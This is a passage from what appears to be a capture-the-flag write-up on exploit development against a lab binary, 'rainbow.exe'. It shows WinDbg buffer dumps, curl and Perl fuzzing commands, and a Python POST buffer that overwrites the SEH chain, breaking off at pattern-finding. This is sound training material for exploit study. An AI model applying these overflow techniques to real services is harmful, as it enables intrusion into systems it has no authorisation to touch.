<span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">]</span><span class="w"> </span><span class="kt">char</span><span class="w">   </span><span class="o">*</span><span class="n">buf</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">  </span><span class="kt">int</span><span class="w">    </span><span class="n">len</span><span class="p">,</span>
<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">  </span><span class="kt">int</span><span class="w">    </span><span class="n">flags</span>
<span class="p">);</span>
</code></pre></div>
<p>That means at the breakpoint, the first four dwords on the stack are the arguments.
</p><div class="highlight"><pre><span></span><code>Breakpoint<span class="w"> </span><span class="m">0</span><span class="w"> </span>hit
<span class="nv">eax</span><span class="o">=</span><span class="m">00000110</span><span class="w"> </span><span class="nv">ebx</span><span class="o">=</span>0022d000<span class="w"> </span><span class="nv">ecx</span><span class="o">=</span><span class="m">00000018</span><span class="w"> </span><span class="nv">edx</span><span class="o">=</span>0019eca8<span class="w"> </span><span class="nv">esi</span><span class="o">=</span>0019ff24<span class="w"> </span><span class="nv">edi</span><span class="o">=</span>0019fdac
<span class="nv">eip</span><span class="o">=</span><span class="m">00401971</span><span class="w"> </span><span class="nv">esp</span><span class="o">=</span>0019ec90<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>0019fe08<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>nz<span class="w"> </span>ac<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000216</span>
rainbow+0x1971:
<span class="m">00401971</span><span class="w"> </span>ff15ccb14000<span class="w">    </span>call<span class="w">    </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>rainbow+0xb1cc<span class="w"> </span><span class="o">(</span>0040b1cc<span class="o">)]</span><span class="w"> </span>ds:002b:0040b1cc<span class="o">={</span>WS2_32!recv<span class="w"> </span><span class="o">(</span>774b23a0<span class="o">)}</span>

<span class="m">0</span>:000&gt;<span class="w"> </span>dd<span class="w"> </span>esp<span class="w"> </span>L4
0019ec90<span class="w">  </span><span class="m">00000110</span><span class="w"> </span>0019eca8<span class="w"> </span><span class="m">00001000</span><span class="w"> </span><span class="m">00000000</span>
</code></pre></div><p></p>
<p>The buffer will get received into <code>0019eca8</code>.  Stepping over the instruction, the <code>recv</code> buffer gets filled.
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:000&gt;<span class="w"> </span>p
<span class="nv">eax</span><span class="o">=</span><span class="m">00001000</span><span class="w"> </span><span class="nv">ebx</span><span class="o">=</span>0022d000<span class="w"> </span><span class="nv">ecx</span><span class="o">=</span><span class="m">00000002</span><span class="w"> </span><span class="nv">edx</span><span class="o">=</span>0019ebf0<span class="w"> </span><span class="nv">esi</span><span class="o">=</span>0019ff24<span class="w"> </span><span class="nv">edi</span><span class="o">=</span>0019fdac
<span class="nv">eip</span><span class="o">=</span><span class="m">00401977</span><span class="w"> </span><span class="nv">esp</span><span class="o">=</span>0019eca0<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>0019fe08<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>zr<span class="w"> </span>na<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000246</span>
rainbow+0x1977:
<span class="m">00401977</span><span class="w"> </span>8945cc<span class="w">          </span>mov<span class="w">     </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>ebp-34h<span class="o">]</span>,eax<span class="w"> </span>ss:002b:0019fdd4<span class="o">=</span><span class="m">00000000</span>
<span class="m">0</span>:000&gt;<span class="w"> </span>db<span class="w"> </span>0x0019eca8<span class="w"> </span>L4096
0019eca8<span class="w">  </span><span class="m">50</span><span class="w"> </span>4f<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="m">54</span><span class="w"> </span><span class="m">20</span><span class="w"> </span>2f<span class="w"> </span><span class="m">69</span><span class="w"> </span>6e-64<span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">78</span><span class="w"> </span>2e<span class="w"> </span><span class="m">68</span><span class="w"> </span><span class="m">74</span><span class="w"> </span>6d<span class="w"> </span>6c<span class="w">  </span>POST<span class="w"> </span>/index.html
0019ecb8<span class="w">  </span><span class="m">20</span><span class="w"> </span><span class="m">48</span><span class="w"> </span><span class="m">54</span><span class="w"> </span><span class="m">54</span><span class="w"> </span><span class="m">50</span><span class="w"> </span>2f<span class="w"> </span><span class="m">31</span><span class="w"> </span>2e-31<span class="w"> </span>0d<span class="w"> </span>0a<span class="w"> </span><span class="m">48</span><span class="w"> </span>6f<span class="w"> </span><span class="m">73</span><span class="w"> </span><span class="m">74</span><span class="w"> </span>3a<span class="w">   </span>HTTP/1.1..Host:
0019ecc8<span class="w">  </span><span class="m">20</span><span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">39</span><span class="w"> </span><span class="m">32</span><span class="w"> </span>2e<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">36</span><span class="w"> </span><span class="m">38</span>-2e<span class="w"> </span><span class="m">35</span><span class="w"> </span><span class="m">36</span><span class="w"> </span>2e<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">30</span><span class="w"> </span>3a<span class="w">   </span><span class="m">192</span>.168.56.100:
0019ecd8<span class="w">  </span><span class="m">38</span><span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">38</span><span class="w"> </span><span class="m">30</span><span class="w"> </span>0d<span class="w"> </span>0a<span class="w"> </span><span class="m">55</span><span class="w"> </span><span class="m">73</span>-65<span class="w"> </span><span class="m">72</span><span class="w"> </span>2d<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">67</span><span class="w"> </span><span class="m">65</span><span class="w"> </span>6e<span class="w"> </span><span class="m">74</span><span class="w">  </span><span class="m">8080</span>..User-Agent
0019ece8<span class="w">  </span>3a<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">75</span><span class="w"> </span><span class="m">72</span><span class="w"> </span>6c<span class="w"> </span>2f<span class="w"> </span><span class="m">38</span>-2e<span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">35</span><span class="w"> </span>2e<span class="w"> </span><span class="m">30</span><span class="w"> </span>0d<span class="w"> </span>0a<span class="w"> </span><span class="m">41</span><span class="w">  </span>:<span class="w"> </span>curl/8.15.0..A
0019ecf8<span class="w">  </span><span class="m">63</span><span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">70</span><span class="w"> </span><span class="m">74</span><span class="w"> </span>3a<span class="w"> </span><span class="m">20</span><span class="w"> </span>2a-2f<span class="w"> </span>2a<span class="w"> </span>0d<span class="w"> </span>0a<span class="w"> </span><span class="m">43</span><span class="w"> </span>6f<span class="w"> </span>6e<span class="w"> </span><span class="m">74</span><span class="w">  </span>ccept:<span class="w"> </span>*/*..Cont
0019ed08<span class="w">  </span><span class="m">65</span><span class="w"> </span>6e<span class="w"> </span><span class="m">74</span><span class="w"> </span>2d<span class="w"> </span>4c<span class="w"> </span><span class="m">65</span><span class="w"> </span>6e<span class="w"> </span><span class="m">67</span>-74<span class="w"> </span><span class="m">68</span><span class="w"> </span>3a<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">34</span><span class="w"> </span><span class="m">31</span><span class="w"> </span><span class="m">33</span><span class="w"> </span><span class="m">35</span><span class="w">  </span>ent-Length:<span class="w"> </span><span class="m">4135</span>
0019ed18<span class="w">  </span>0d<span class="w"> </span>0a<span class="w"> </span><span class="m">43</span><span class="w"> </span>6f<span class="w"> </span>6e<span class="w"> </span><span class="m">74</span><span class="w"> </span><span class="m">65</span><span class="w"> </span>6e-74<span class="w"> </span>2d<span class="w"> </span><span class="m">54</span><span class="w"> </span><span class="m">79</span><span class="w"> </span><span class="m">70</span><span class="w"> </span><span class="m">65</span><span class="w"> </span>3a<span class="w"> </span><span class="m">20</span><span class="w">  </span>..Content-Type:<span class="w"> </span>
0019ed28<span class="w">  </span><span class="m">61</span><span class="w"> </span><span class="m">70</span><span class="w"> </span><span class="m">70</span><span class="w"> </span>6c<span class="w"> </span><span class="m">69</span><span class="w"> </span><span class="m">63</span><span class="w"> </span><span class="m">61</span><span class="w"> </span><span class="m">74</span>-69<span class="w"> </span>6f<span class="w"> </span>6e<span class="w"> </span>2f<span class="w"> </span><span class="m">78</span><span class="w"> </span>2d<span class="w"> </span><span class="m">77</span><span class="w"> </span><span class="m">77</span><span class="w">  </span>application/x-ww
0019ed38<span class="w">  </span><span class="m">77</span><span class="w"> </span>2d<span class="w"> </span><span class="m">66</span><span class="w"> </span>6f<span class="w"> </span><span class="m">72</span><span class="w"> </span>6d<span class="w"> </span>2d<span class="w"> </span><span class="m">75</span>-72<span class="w"> </span>6c<span class="w"> </span><span class="m">65</span><span class="w"> </span>6e<span class="w"> </span><span class="m">63</span><span class="w"> </span>6f<span class="w"> </span><span class="m">64</span><span class="w"> </span><span class="m">65</span><span class="w">  </span>w-form-urlencode
0019ed48<span class="w">  </span><span class="m">64</span><span class="w"> </span>0d<span class="w"> </span>0a<span class="w"> </span>0d<span class="w"> </span>0a<span class="w"> </span><span class="m">66</span><span class="w"> </span><span class="m">75</span><span class="w"> </span>7a-7a<span class="w"> </span><span class="m">65</span><span class="w"> </span><span class="m">64</span><span class="w"> </span>3d<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>d....fuzzed<span class="o">=</span>AAAA
0019ed58<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed68<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
<span class="o">[</span>...<span class="o">]</span>
<span class="o">[</span>...<span class="o">]</span>
0019fc98<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019fca8<span class="w">  </span><span class="m">01</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">01</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span>-10<span class="w"> </span><span class="m">01</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w">  </span>................
</code></pre></div><p></p>
<p>As can be seen, this pass was for some 0x1000 bytes.</p>
<p>Passing over again, we see that the buffer was zeroed out, and the remaining 0x20 + len(http POST request minus data) bytes was received:
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:000&gt;<span class="w"> </span>p
<span class="nv">eax</span><span class="o">=</span>000000cc<span class="w"> </span><span class="nv">ebx</span><span class="o">=</span>0022d000<span class="w"> </span><span class="nv">ecx</span><span class="o">=</span><span class="m">00000002</span><span class="w"> </span><span class="nv">edx</span><span class="o">=</span>0019ebf0<span class="w"> </span><span class="nv">esi</span><span class="o">=</span>0019ff24<span class="w"> </span><span class="nv">edi</span><span class="o">=</span>0019fdac
<span class="nv">eip</span><span class="o">=</span><span class="m">00401977</span><span class="w"> </span><span class="nv">esp</span><span class="o">=</span>0019eca0<span class="w"> </span><span class="nv">ebp</span><span class="o">=</span>0019fe08<span class="w"> </span><span class="nv">iopl</span><span class="o">=</span><span class="m">0</span><span class="w">         </span>nv<span class="w"> </span>up<span class="w"> </span>ei<span class="w"> </span>pl<span class="w"> </span>zr<span class="w"> </span>na<span class="w"> </span>pe<span class="w"> </span>nc
<span class="nv">cs</span><span class="o">=</span><span class="m">0023</span><span class="w">  </span><span class="nv">ss</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">ds</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">es</span><span class="o">=</span>002b<span class="w">  </span><span class="nv">fs</span><span class="o">=</span><span class="m">0053</span><span class="w">  </span><span class="nv">gs</span><span class="o">=</span>002b<span class="w">             </span><span class="nv">efl</span><span class="o">=</span><span class="m">00000246</span>
rainbow+0x1977:
<span class="m">00401977</span><span class="w"> </span>8945cc<span class="w">          </span>mov<span class="w">     </span>dword<span class="w"> </span>ptr<span class="w"> </span><span class="o">[</span>ebp-34h<span class="o">]</span>,eax<span class="w"> </span>
<span class="m">0</span>:000&gt;<span class="w"> </span>db<span class="w"> </span>0x0019eca8<span class="w"> </span>L100
0019eca8<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ecb8<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ecc8<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ecd8<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ece8<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ecf8<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed08<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed18<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed28<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed38<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed48<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed58<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w">  </span>AAAAAAAAAAAAAAAA
0019ed68<span class="w">  </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span>-41<span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">41</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w">  </span>AAAAAAAAAAAA....
0019ed78<span class="w">  </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span>-00<span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w"> </span><span class="m">00</span><span class="w">  </span>................
</code></pre></div><p></p>
<p>The maths
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/rainbow/dump<span class="o">]</span>
└─$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">'ibase=16; obase=A; D64-C68'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>bc
<span class="m">252</span>
</code></pre></div><p></p>
<p>The http post request added to the request has thrown off initial assumptions.</p>
<p>One key discovery is that during testing, I found that the payload only makes it to the functionpointer exec if the connection is kept open.</p>
<p>Additionally, I found that the sent data can be max 0x1000 bytes, anything over that resets the buffer (causes it to get zeroed back out and any modulo 0x1000 is received as the buffer)</p>
<p>The following has two breakpoints, one at the call for recv, the other at the function call that contains the functionpointer exec.</p>
<div class="highlight"><pre><span></span><code><span class="o">((</span>cmd.exe<span class="w"> </span>/c<span class="w"> </span><span class="s2">"taskkill /F /IM rainbow.exe"</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span>START<span class="w"> </span>/B<span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="s2">"c:\rainbow\rainbow.exe"</span><span class="w"> </span>&gt;<span class="w"> </span>c:<span class="se">\u</span>sers<span class="se">\a</span>dmin<span class="se">\d</span>esktop<span class="se">\c</span>urrent_thing<span class="se">\o</span>utput.txt<span class="o">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="s2">"C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe"</span><span class="w"> </span>-WF<span class="w"> </span>C:<span class="se">\w</span>indbg_custom.WEW<span class="w"> </span>-pn<span class="w"> </span>rainbow.exe<span class="w"> </span>-c<span class="w"> </span><span class="s1">'bp 0x00401971; bp 0x0040232f; g'</span>
</code></pre></div>
<h1 id="finding-a-crash">Finding a crash<a class="headerlink" href="#finding-a-crash" title="Permanent link">¶</a></h1>
<p>I found that if I debug without any breakpoints, and if I send a POST request with 0x1000 bytes, I get a response back.
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
└─$<span class="w"> </span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s2">"printf 'A'x0x1000"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://192.168.56.100:8080/index.html<span class="w"> </span>-d<span class="w"> </span><span class="s2">"fuzzed=</span><span class="k">$(</span>cat<span class="w"> </span>-<span class="k">)</span><span class="s2">"</span>
&lt;html&gt;&lt;h1&gt;404<span class="w"> </span>Not<span class="w"> </span>Found&lt;/h1&gt;&lt;/html&gt;
</code></pre></div><p></p>
<p>If I back that off just by 0x100 bytes, I get AccessViolation.
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>~/htb/machines/rainbow<span class="o">]</span>
└─$<span class="w"> </span>perl<span class="w"> </span>-e<span class="w"> </span><span class="s2">"printf 'A'x0x0f00"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://192.168.56.100:8080/index.html<span class="w"> </span>-d<span class="w"> </span><span class="s2">"fuzzed=</span><span class="k">$(</span>cat<span class="w"> </span>-<span class="k">)</span><span class="s2">"</span>
</code></pre></div><p></p>
<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../../../../Pasted_image_20251026012334.png" data-desc-position="bottom"><img alt="Pasted_image_20251026012334.png" src="../../../../Pasted_image_20251026012334.png"></a></p>
<p>The exception chain shows that it has been overwritten with As:
</p><div class="highlight"><pre><span></span><code><span class="m">0</span>:003&gt;<span class="w"> </span>!exchain
009bfbe4:<span class="w"> </span><span class="m">41414141</span>
Invalid<span class="w"> </span>exception<span class="w"> </span>stack<span class="w"> </span>at<span class="w"> </span><span class="m">41414141</span>
</code></pre></div><p></p>
<p>Further, once converted to python,  I found that I can coerce this failure with a very minimal POST body, saving space and eliminating variability.</p>
<p></p><div class="highlight"><pre><span></span><code><span class="n">buf</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="p">(</span><span class="s2">"</span><span class="se">\x41</span><span class="s2">"</span> <span class="o">*</span> <span class="mh">0xf00</span><span class="p">)</span>
</code></pre></div>
^^ 3908 bytes total<p></p>
<h1 id="finding-the-pattern">Finding the pattern<a class="headerlink" href="#finding-the-pattern" title="Permanent link">¶</a></h1>
<p>Retesting with a pattern, with the following buffer.  I'll pass the pattern string in at CLI invocation.
</p><div class="highlight"><pre><span></span><code><span class="n">buf</span> <span class="o">=</span> <span class="s2">"POST / HTTP/1.1</span><span class="se">\x0d\x0a</span><span class="s2">Content-Type: application/x-www-form-urlencoded</span><span class="se">\x0d\x0a\x0d\x0a</span><span class="s2">"</span>
